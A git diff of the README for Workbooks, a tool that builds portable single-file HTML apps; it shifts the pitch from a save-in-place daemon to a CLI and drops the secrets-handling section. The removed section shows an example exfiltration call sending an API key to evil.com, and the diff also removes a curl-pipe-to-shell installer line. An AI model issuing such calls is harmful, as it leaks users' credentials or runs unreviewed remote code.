@@ -1,20 +1,15 @@
 <!-- README — workbooks -->
 
-<p align="center">
-  <video src="https://github.com/user-attachments/assets/777b474b-2eac-4f2f-8c20-a34444c959f2" autoplay muted loop playsinline width="800"></video>
-</p>
-
 <h1 align="center">Workbooks</h1>
 
 <p align="center">
-  <strong>Plain HTML files that save themselves.</strong><br/>
-  <sub>One file. Open it. Edit it. Hit save. The file on disk updates.</sub>
+  <strong>Portable HTML mini-apps. One file. Email it. It runs anywhere.</strong><br/>
+  <sub>The CLI compiles a project tree into a single .html, with the source bundled inside.</sub>
 </p>
 
 <p align="center">
-  <a href="https://workbooks.sh"><img src="https://img.shields.io/badge/workbooks.sh-install-34d399?style=flat-square&labelColor=0a0a0a" alt="install"></a>
-  <a href="https://github.com/shinyobjectz-sh/workbooks/releases/latest"><img src="https://img.shields.io/github/v/release/shinyobjectz-sh/workbooks?include_prereleases&style=flat-square&labelColor=0a0a0a&color=f5f5f5&label=daemon" alt="latest release"></a>
-  <img src="https://img.shields.io/badge/macOS-signed%20%2B%20notarized-f5f5f5?style=flat-square&labelColor=0a0a0a" alt="signed">
+  <a href="https://www.npmjs.com/package/@work.books/cli"><img src="https://img.shields.io/npm/v/@work.books/cli?style=flat-square&labelColor=0a0a0a&color=34d399&label=cli" alt="npm cli"></a>
+  <a href="https://www.npmjs.com/package/@work.books/runtime"><img src="https://img.shields.io/npm/v/@work.books/runtime?style=flat-square&labelColor=0a0a0a&color=f5f5f5&label=runtime" alt="npm runtime"></a>
   <img src="https://img.shields.io/badge/license-Apache--2.0-6b7280?style=flat-square&labelColor=0a0a0a" alt="Apache-2.0">
 </p>
 
@@ -27,148 +22,84 @@ Photoshop, or your favourite IDE. The browser is the only universal
 viewer humans have agreed on.
 
 But the browser was built for *visiting* — open a URL, look at a page,
-move on. It was never designed to be the format for documents you keep
-around: spreadsheets you tweak, notebooks you re-run, dashboards you
-hand to a colleague.
+move on. It was never designed to be the format for **artifacts you ship
+to someone**: a chart with the data in it, a notebook with the
+analysis baked in, a tool that works the moment you double-click.
 
-Workbooks is the missing piece. It treats HTML as a document format —
-self-contained, portable, savable — the way Word treated `.doc`. Your
-file holds its own runtime, its own code, and its own state. Open it
-anywhere; edit it where you have the runtime; share it as a file.
+Workbooks is the missing piece. The CLI takes your project — Svelte,
+React, vanilla, whatever — and compiles it into a single self-contained
+`.html` that runs in any browser. Your charts, your code, your data,
+your fonts — all inlined. The recipient double-clicks and it just runs.
 
-You don't deploy a workbook. You don't host it. You don't pay for it
-to be online. **You email it.**
+Better still: the CLI also embeds your **source tree** inside the .html
+(gzipped, ignored by the browser, recovered with `workbook unbundle`).
+The artifact is portable AND iterable — recipients can extract the
+source, tweak it, rebuild. No server. No deploy. No login. Just a file.
 
 ---
 
 ## What's in the file
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/diagrams/anatomy.svg">
-  <img src="assets/diagrams/anatomy.svg" alt="A workbook is a single HTML file containing the inlined runtime, your code, and the persisted state — all in one." width="100%">
-</picture>
-
 A workbook is **one HTML file**. Open it in any browser and it renders
-— without anything installed. With the runtime installed, the same
-file becomes editable: changes survive a refresh because they're
-written back to the bytes on disk.
+— without anything installed.
 
-Three layers, all inlined:
+Three things are inlined:
 
-- **Runtime** — Yjs CRDT, save handler, daemon-link bootstrap. Compresses to ~850 KB. Self-decompresses when the page loads.
-- **Your code** — what `workbook build` bundles from your project. Single JS chunk, no external CDN, no fetch on open.
-- **Persisted state** — `<script id="wb-snapshot:…">` and `<script id="wb-wal:…">` blocks at the bottom of the body. The file *is* the database.
+- **The runtime + your code** — what `workbook build` produces. Single JS chunk, no external CDN, no fetch on open. Wasm runtimes (Polars / Rhai / Plotters / Candle) ship inside the file when you opt into them.
+- **The source bundle** — a gzipped JSON snapshot of your project tree (default on, opt out with `--no-bundle`). Recovers via `workbook unbundle`. Optional `.git/` history with `--bundle-git`.
+- **Author claim + integrity guard** — optional Ed25519 signature over the artifact bytes. Recipients can verify the file came from you and hasn't been altered.
 
-Share the file → you ship the state with it.
-
----
-
-## How it runs
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/diagrams/runtime.svg">
-  <img src="assets/diagrams/runtime.svg" alt="Double-click a workbook .html file. The OS routes to Workbooks.app, which asks workbooksd to mint a session token and open the daemon URL in your default browser. Cmd+S writes new bytes to the daemon, which atomically rewrites the file on disk." width="100%">
-</picture>
-
-Workbooks needs exactly one component you don't already have: a tiny
-Rust daemon (`workbooksd`, ~1 MB) that runs in the background and
-brokers between the browser and your filesystem. Every other piece is
-already on your machine.
-
-When you double-click a workbook `.html` file:
-
-1. The OS routes the file to `Workbooks.app` — installed by `workbooks.sh` and registered as the per-file handler via the `LaunchServices.OpenWith` extended attribute the daemon stamps on every workbook it sees.
-2. The app asks the daemon to bind the file's path to a session token.
-3. The daemon opens your default browser at `http://127.0.0.1:<port>/wb/<token>/` (the daemon binds a random port at startup; the app reads it from `runtime.json`).
-4. The browser loads the workbook from the daemon (same origin, full power).
-5. ⌘S sends the new bytes back; the daemon does an atomic rename. **No partial writes, no temp leftovers, no race with whatever is reading the file.**
-
-A workbook is just an HTML file — open it in any browser without installing the daemon and it still renders. The daemon is what unlocks save-in-place, secrets, and per-file API key allowlists.
-
-The daemon is small on purpose. Less than 4 MB on disk. Single
-binary, no Electron, no WebView, no Tauri. Your default browser does
-all the rendering — the daemon just owns the parts a browser can't:
-filesystem and OS keychain.
-
----
-
-## Secrets, accounted for
-
-Self-serve workbooks need API keys. We treated this like a security
-product, because that's what it is.
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets/diagrams/secrets.svg">
-  <img src="assets/diagrams/secrets.svg" alt="The user pastes an API key once. The daemon stores it in the OS keychain, namespaced by the workbook file's path. The agent and any code in the page asks the daemon to make outbound HTTPS calls; the daemon splices the key into the right header. Browser code never sees the value." width="100%">
-</picture>
-
-A user pastes their fal.ai or ElevenLabs API key once into the
-Integrations panel. Here's everything that happens:
-
-- **Storage** — daemon writes the value to the OS keychain (macOS Keychain / Linux Secret Service / Windows Credential Manager), namespaced by a hash of the workbook's path. Workbook B served by the same daemon **cannot** read workbook A's keys.
-- **Use** — when the agent (or your code) calls `wb.fetch({ url, auth: { secretId: "FAL_API_KEY", ... } })`, the daemon resolves the value, splices it into the named header, and forwards the HTTPS request. The browser never sees the value.
-- **Outbound limits** — the workbook's own config declares which hosts each secret may be sent to. The daemon refuses anything else with `403`. A malicious skill can't say `wb.fetch("https://evil.com", { auth: { secretId: "FAL_API_KEY" } })` and have the daemon helpfully forward your key.
-- **Save scan** — before persisting a workbook back to disk, the daemon scans the body for any active secret value as a literal substring. If the agent accidentally embedded your key into composition HTML, save is **refused** with a `409 Conflict`. (varlock-inspired; a real attack the file-as-database model otherwise enables.)
-- **Page-side defense** — the SDK patches `console.*`, error handlers, and global `fetch`. Any registered secret value that ends up in a log or a cross-origin request gets scrubbed or refused at the JavaScript layer.
-- **Memory hygiene** — keychain reads land in a `secrecy::SecretString`. Drop zeroizes the buffer; `Debug` prints `[REDACTED]`.
-- **Headers** — every served workbook page comes with `Content-Security-Policy: connect-src 'self'`, `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`. CSP alone blocks most of these attacks at the browser layer; the daemon-side checks are the belt under the suspenders.
-- **Audit** — every read/write/proxy lands in `~/Library/Logs/workbooksd-audit.log`. Timestamps, paths, secret ids, upstream hosts. **Never values.**
-
-You get an "ending in `xyzy`" preview computed daemon-side so the UI
-can confirm the right key is set without ever re-reading the value
-back to browser memory.
-
-> **Plain English:** sharing a workbook file is safe. Receiving one
-> someone else built is safe. Pasting a key into one is safe. Each of
-> those statements is the daemon's job.
-
-Full threat model: [docs/SECURITY_MODEL.md](docs/SECURITY_MODEL.md).
+Share the file → you ship the artifact AND the source it came from.
 
 ---
 
 ## Try one
 
 ```sh
-curl -fsSL https://workbooks.sh/install | sh
-```
-
-This puts a small program (about 1 MB) in the background of your Mac.
-After that, every workbook you double-click opens in your browser and
-can save in place — like a document.
-
-Then grab any of the examples and double-click:
-
-```sh
-git clone https://github.com/shinyobjectz-sh/workbooks
-open workbooks/examples/csv-explore/dist/csv-explore.html
-```
-
-The page comes up. Drop a CSV. Type SQL. Hit save. The file changes
-on disk. Send it to a colleague. They get your data and your queries.
-
----
-
-## Make your own
-
-```sh
 npm install -g @work.books/cli
-workbook init my-thing
+workbook init my-thing --template=spa
 cd my-thing
+workbook dev          # Vite dev server, HMR
+workbook build        # produces dist/my-thing.html
+```
+
+Out comes one `dist/my-thing.html` file. Email it. Drop it on a USB
+stick. Put it on a CDN. It opens anywhere — it's plain HTML.
+
+A recipient who wants to iterate:
+
+```sh
+workbook unbundle my-thing.html ./my-thing-source
+cd my-thing-source && npm install
 workbook dev
 ```
 
-Edit `main.js`. The page reloads. Standard front-end loop.
+Their tree matches yours, modulo the ignored bits (no `node_modules`,
+no `.env`, no `.git` unless you opted in).
 
-When you're done:
+---
 
-```sh
-workbook build
-```
+## When you need persistence
 
-Out comes one `dist/my-thing.html` file. Email it. Drop it
-on a USB stick. Put it on a CDN. It opens anywhere — it's plain HTML.
+Some workflows need state to survive a session: a binder of dashboards
+shared between teammates, a chart whose data updates daily, a notebook
+multiple people co-edit.
 
-A starter `workbook.config.mjs` declares what your workbook needs:
+For those, share via **[workbooks.sh](https://workbooks.sh)** — upload
+the `.html`, get a URL, recipients sign in with their own identity and
+their state persists per-user. The `.html` stays portable; the hosted
+view adds login, storage, and sharing.
+
+You don't have to host a workbook to share it. Hosting is the path
+**when you want recipients to keep their own state across sessions**.
+For one-off artifacts (a cool chart, a tool, a presentation, a
+self-contained calculator) the bare `.html` is the answer.
+
+---
+
+## Author config
+
+A starter `workbook.config.mjs`:
 
 ```js
 export default {
@@ -177,33 +108,42 @@ export default {
   type: "spa",                 // "document" | "notebook" | "spa"
   entry: "src/index.html",
   wasmVariant: "app",          // "app" | "minimal" | "default"
-  secrets: {
-    FAL_API_KEY: { domains: ["*.fal.run"] },
-  },
+  // Source bundle is on by default. Opt out for proprietary trees:
+  // bundle: false,
+  // Or trim what travels:
+  // bundle: { additionalIgnore: ["fixtures/", "*.bak"] },
+  // Or include git history:
+  // bundle: { includeGit: true },
 };
 ```
 
-That `secrets` block is the daemon's enforcement contract. The cli
-bakes it into the workbook; the daemon reads it at serve time;
-`/proxy` refuses any URL whose host doesn't match.
+Build flags:
+
+```
+workbook build [project]
+  --no-bundle      skip embedding the source bundle
+  --bundle-git     include the .git/ directory in the bundle
+  --no-wasm        skip wasm + runtime inlining (dev-only, smaller files)
+  --encrypt        wrap in a passphrase lock screen (age-v1)
+  --out <dir>      output directory (default dist/)
+```
 
 Author guides:
 [docs/WORKBOOK_AUTHORING.md](docs/WORKBOOK_AUTHORING.md) ·
 [docs/SPEC.md](docs/SPEC.md) ·
-[docs/OPERATIONS.md](docs/OPERATIONS.md).
+[docs/SECURITY_MODEL.md](docs/SECURITY_MODEL.md).
 
 ---
 
 ## What's possible
 
-A workbook is not "an app" or "a notebook" — it's a *shape*. Some
-shapes we ship today, others you'll find first:
+A workbook is not "an app" or "a notebook" — it's a *shape*:
 
-- **Live data tools** — CSV explorer, SQL workbench, Polars notebooks. Drop a file, run queries, save state with the file.
-- **Reactive notebooks** — cells, DAG, hot recompute. Same file format whether you're authoring or reading.
-- **Self-contained micro-apps** — chess, drawing tools, image editors. State lives in the file; share it = ship it.
-- **LLM-agent-authored documents** — colorwave, sift. The agent edits the workbook in place; the user co-edits live.
-- **Cross-team artifacts** — incident reports that re-run their own queries; status pages that hold their own data; product specs with embedded interactive demos.
+- **Charts with their data inside** — drop a Vega-Lite spec + JSON, share a single .html that re-renders the chart anywhere.
+- **SQL workbenches** — Polars or DuckDB inlined, queries embedded, the recipient runs them locally.
+- **Reactive notebooks** — cells, DAG, hot recompute. Cell sources travel with the file via the source bundle.
+- **Self-contained micro-apps** — chess, drawing tools, image editors, calculators. State held in URL fragments or localStorage.
+- **LLM-agent-authored artifacts** — colorwave, sift. Agents emit deliberately-structured workbooks (sections + outline + audit) that ship as portable HTML.
 - **Encrypted workbooks** — passphrase-locked at rest, opened with the runtime; secrets never round-trip through any server.
 
 The constraint isn't the format. The constraint is figuring out what
@@ -213,88 +153,90 @@ The constraint isn't the format. The constraint is figuring out what
 
 ## Pieces
 
-|  | what | scope |
+| Package | What | Notes |
 |---|---|---|
-| `packages/workbooksd` | The Rust daemon. Save broker, secrets vault, file association handler. | ~1 MB, single binary |
+| `packages/workbook-cli` | `workbook init`, `dev`, `build`, `unbundle`. | npm: `@work.books/cli` |
 | `packages/runtime` | Browser-side runtime + SDK (`wb.text`, `wb.collection`, `wb.app`, `wb.secret`, `wb.fetch`). | npm: `@work.books/runtime` |
 | `packages/runtime-wasm` | The Rust + WASM heavy lifters (Polars, Plotters, Rhai, Candle). Three pre-built feature slices. | npm: `@work.books/runtime-wasm` |
-| `packages/workbook-cli` | Author tools: `workbook init`, `dev`, `build`, `check`. | npm: `@work.books/cli` |
-| `packages/workbook-substrate` | The file-as-database parser, hydrator, integrity guard. | npm: `@work.books/substrate` |
-| `examples/` | Reference workbooks. Each ships a built `.html` artifact you can open. | clone-and-open |
-| `site/` | The workbooks.sh landing page + installer script. | Cloudflare Pages |
-| `docs/` | Spec, operations, security model, refactor notes. | start [here](docs/SPEC.md) |
+| `packages/workbook-substrate` | File-as-database parser + hydrator (used by save-in-place workbooks running under the legacy daemon). | npm: `@work.books/substrate` |
+| `packages/workbooksd` | **Legacy.** Local Rust daemon for save-in-place editing. See "Legacy daemon" below. | ~1 MB single binary |
+| `examples/` | Reference workbooks — each ships a built `.html` you can open. | clone-and-open |
+| `docs/` | Spec, operations, security model. | start [here](docs/SPEC.md) |
+
+---
+
+## Legacy daemon
+
+Earlier versions of workbooks centered on a small Rust daemon
+(`workbooksd`) that brokered save-in-place — double-click a `.html`,
+edit it, hit ⌘S, the bytes on disk update. The daemon is real, it
+works, it's signed + notarized for macOS. It's still in this repo.
+
+We've moved away from it as the **primary** model because:
+
+- The macOS install + signing + Gatekeeper + LaunchServices routing
+  story is high-cost for low-value-to-most-users.
+- The dominant use case is shipping a finished artifact to someone,
+  not co-editing one over time.
+- Persistence-heavy workflows are better served by the hosted
+  [workbooks.sh](https://workbooks.sh) viewer where users sign in
+  with their own identity.
+
+The daemon stays in-tree as a local-power-user tool. If you want
+save-in-place locally, you can still install it. We're not building
+new features for it; we're not deleting it either. Treat it as a niche.
 
 ---
 
 ## Status
 
-**Daemon, macOS** — shipping. Apple Developer ID signed, Apple
-notarized, SHA-256 verified. Apple Silicon and Intel.
+**CLI** — published on npm (`@work.books/cli`). Stable. v0.5.0 added the
+source-bundle stage.
 
-**Daemon, Linux** — shipping (x86_64). Bare ELF binary on the same
-release page; install script handles the placement.
+**Runtime + runtime-wasm slices** — published on npm. Stable.
 
-**Daemon, Windows** — wired in CI, awaits signing pipeline (Microsoft
-Trusted Signing).
+**Daemon** — legacy. Continues to ship signed builds for macOS / Linux
+/ (pending) Windows. No new features planned.
 
-**SDK + cli** — published on npm. Stable.
-
-**Runtime-wasm slices** — three variants on disk; CLI picks via
-`wasmVariant`. Build-time check warns if you've picked one too small
-for your code.
-
-**Secrets API** — phase 1 (daemon keychain + proxy), phase 2 (domain
-allowlist + save-scan + audit log + memory hygiene), phase 3 (page-
-side leak defense + redacted previews) — all live in `workbooksd
-0.1.0`.
+**Hosted viewer (workbooks.sh)** — separate hosted surface; not in this
+repo. The lander redirects you there.
 
 The architecture is settled. The roadmap from here is about more
-shapes, more examples, sharper docs. Nothing breaking; nothing
-load-bearing left to bolt on.
+shapes, more examples, sharper docs.
 
 ---
 
 ## Questions you might have
 
 **Is this just an Electron alternative?**
-No. Electron ships a browser engine *with each app* (~150 MB). Workbooks
-ships nothing — your browser is the browser, the daemon is 1 MB, and a
-workbook file averages 1–10 MB depending on the WASM slice. Electron is
-how you build a desktop app on web tech. Workbooks is how you build a
-*document format* on web tech.
+No. Electron ships a browser engine *with each app* (~150 MB). A workbook
+ships nothing extra — your browser is the browser. A workbook .html
+averages 1–10 MB depending on the WASM slice you opt into.
 
 **Is this just a static-site generator?**
-No. A static-site generator builds an HTML file. A workbook is also an
-HTML file, but it has a runtime, persistent state, and a save loop. The
-file is the application AND the database. After your "static" build, a
-workbook can still be edited, the edits stick, and the file you keep
-sharing has them.
+Closer, but no. An SSG builds an HTML file. A workbook is an HTML file
+that bundles its own source tree, runtime, and (optionally) wasm
+heavy-lifters. The recipient can extract the source and rebuild — try
+that with a Hugo site.
 
-**Why not just use the File System Access API?**
-We do, where it works. But it's Chromium-only, requires user permission
-each session, and refuses to bind a file you opened via `file://` —
-which is most of the workflows users actually want. The daemon route
-gives the same UX everywhere.
+**Why bundle the source?**
+Because the artifact-and-its-source-as-one-file is the unique thing
+the format unlocks. Recipients aren't blocked behind "find the repo,
+clone it, hope it builds." Open the .html, run `workbook unbundle`,
+iterate.
 
-**Why not Tauri / WebView / Wails?**
-Those bundle a web view *with each app*. The pitch is one file per
-"app", which means we can't ship a runtime per file. The right shape
-for the workbooks model is one runtime per *machine*, and the file
-itself stays portable.
-
-**What if the daemon isn't installed?**
-The file still opens. It just opens read-only — every other browser
-capability (rendering, scripting, WASM, IndexedDB) works fine. Hit Cmd+S,
-nothing happens; that's it.
+**What about state and login?**
+Use [workbooks.sh](https://workbooks.sh) for hosted state. The local
+daemon is legacy; we're not the right tool if you need a daemon-driven
+save loop on every recipient's machine.
 
 **Is the runtime open source?**
 Yes. Apache-2.0. The whole repo: daemon, cli, runtime, runtime-wasm,
-substrate. The notarization keys aren't shared, but anyone can build
-unsigned binaries from source.
+substrate. Anyone can build from source.
 
 ---
 
 <p align="center">
   <strong>workbooks.sh</strong><br/>
-  <sub>plain html files that save themselves.</sub>
+  <sub>portable html mini-apps that travel with their source.</sub>
 </p>
